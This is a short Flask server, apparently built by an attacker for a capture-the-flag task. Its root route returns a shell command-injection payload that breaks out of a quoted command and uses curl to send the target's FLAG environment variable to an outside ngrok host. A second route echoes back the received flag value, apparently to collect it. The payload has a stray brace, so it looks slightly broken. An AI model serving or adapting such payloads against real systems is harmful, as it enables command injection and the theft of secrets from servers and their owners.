from flask import Flask, request
import os

app = Flask(__name__)

@app.route('/')
def index():
    # Get the 'flag' query parameter
    flag_param = request.args.get('flag', '')
    
    # Create the response string
    response_string = '"; curl "https://e491-193-205-210-46.ngrok-free.app?flag=$(echo $FLAG})"'
    
    return response_string

@app.route('/flag')
def flag():
    # Get the 'flag' query parameter
    flag_param = request.args.get('flag', '')
    
    # Create the response string
    response_string = 'FLAG: ' + flag_param
    
    return response_string

if __name__ == '__main__': 
    # Run the server
    app.run(host='0.0.0.0', port=5000)
